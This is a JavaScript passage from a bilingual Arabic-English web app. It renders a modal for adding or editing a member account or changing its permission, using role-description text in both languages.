  document.getElementById('modal-root').innerHTML = modalShell(user ? (permissionOnly ? choose('تعديل صلاحية الحساب', 'Change account permission') : choose('تعديل حساب العضو', 'Edit member account')) : t('addMember'), choose('الصلاحية تحدد ما يستطيع العضو رؤيته وتعديله داخل المشاريع.', 'The role defines what this member can see and change across projects.'), form, 'user');
}
